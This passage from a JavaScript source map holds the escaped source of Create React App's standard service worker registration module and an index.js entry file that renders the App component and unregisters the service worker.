return;\n        }\n        installingWorker.onstatechange = () => {\n          if (installingWorker.state === 'installed') {\n            if (navigator.serviceWorker.controller) {\n              // At this point, the updated precached content has been fetched,\n              // but the previous service worker will still serve the older\n              // content until all client tabs are closed.\n              console.log(\n                'New content is available and will be used when all ' +\n                  'tabs for this page are closed. See https://bit.ly/CRA-PWA.'\n              );\n\n              // Execute callback\n              if (config && config.onUpdate) {\n                config.onUpdate(registration);\n              }\n            } else {\n              // At this point, everything has been precached.\n              // It's the perfect time to display a\n              // \"Content is cached for offline use.\" message.\n              console.log('Content is cached for offline use.');\n\n              // Execute callback\n              if (config && config.onSuccess) {\n                config.onSuccess(registration);\n              }\n            }\n          }\n        };\n      };\n    })\n    .catch(error => {\n      console.error('Error during service worker registration:', error);\n    });\n}\n\nfunction checkValidServiceWorker(swUrl, config) {\n  // Check if the service worker can be found. If it can't reload the page.\n  fetch(swUrl)\n    .then(response => {\n      // Ensure service worker exists, and that we really are getting a JS file.\n      const contentType = response.headers.get('content-type');\n      if (\n        response.status === 404 ||\n        (contentType != null && contentType.indexOf('javascript') === -1)\n      ) {\n        // No service worker found. Probably a different app. Reload the page.\n        navigator.serviceWorker.ready.then(registration => {\n          registration.unregister().then(() => {\n            window.location.reload();\n          });\n        });\n      } else {\n        // Service worker found. Proceed as normal.\n        registerValidSW(swUrl, config);\n      }\n    })\n    .catch(() => {\n      console.log(\n        'No internet connection found. App is running in offline mode.'\n      );\n    });\n}\n\nexport function unregister() {\n  if ('serviceWorker' in navigator) {\n    navigator.serviceWorker.ready.then(registration => {\n      registration.unregister();\n    });\n  }\n}\n","import React from 'react';\nimport ReactDOM from 'react-dom';\nimport App from './App';\nimport * as serviceWorker from './serviceWorker';\n\nReactDOM.render(<App />, document.getElementById('root'));\n\n// If you want your app to work offline and load faster, you can change\n// unregister() to register() below. Note this comes with some pitfalls.\n// Learn more about service workers: https://bit.ly/CRA-PWA\nserviceWorker.unregister();\n"],"sourceRoot":""}